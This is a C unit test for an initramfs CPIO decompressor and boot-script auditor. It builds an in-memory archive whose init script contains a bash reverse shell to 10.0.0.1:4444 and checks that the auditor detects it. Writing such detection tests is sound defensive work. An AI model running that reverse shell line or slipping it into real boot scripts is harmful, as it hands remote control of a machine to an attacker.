/**
 * @file test_initramfs_auditor.c
 * @brief Unit tests for in-memory CPIO initramfs decompressor and early-boot script auditor.
 */
#include "test_framework.h"
#include "initramfs_auditor.h"

#include <string.h>

static void test_cpio_archive_and_script_audit(void) {
    TEST_START("test_cpio_archive_and_script_audit");

    // Construct a synthetic CPIO archive in memory containing an infected init script
    uint8_t cpio_buf[2048];
    memset(cpio_buf, 0, sizeof(cpio_buf));

    const char *hdr1 = "070701"
                       "00000001" // ino
                       "000081ED" // mode (0100755)
                       "00000000" // uid
                       "00000000" // gid
                       "00000001" // nlink
                       "00000000" // mtime
                       "00000040" // filesize = 64 bytes (hex 40)
                       "00000000" // devmajor
                       "00000000" // devminor
                       "00000000" // rdevmajor
                       "00000000" // rdevminor
                       "00000005" // namesize = 5 bytes ("init\0")
                       "00000000"; // chksum

    memcpy(cpio_buf, hdr1, 110);
    memcpy(cpio_buf + 110, "init", 5);

    // Padding for namesize (110 + 5 = 115 -> padded to 116)
    size_t data_offset = 116;
    const char *payload = "#!/bin/sh\n"
                          "echo 'Booting...'\n"
                          "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
    memcpy(cpio_buf + data_offset, payload, strlen(payload));

    initramfs_scan_result_t res;
    booto_error_t err = initramfs_audit_buffer(cpio_buf, sizeof(cpio_buf), &res);

    ASSERT_INT_EQ(err, BOOTO_OK, "CPIO archive audit must succeed");
    ASSERT_TRUE(res.files_extracted >= 1, "Must extract at least 1 file");
    ASSERT_TRUE(res.threats_detected >= 1, "Must detect reverse shell threat in init script");

    TEST_PASS("test_cpio_archive_and_script_audit");
}

int main(void) {
    printf("\n--- Running Initramfs CPIO Auditor Tests ---\n");
    test_cpio_archive_and_script_audit();
    TEST_SUMMARY();
    return 0;
}
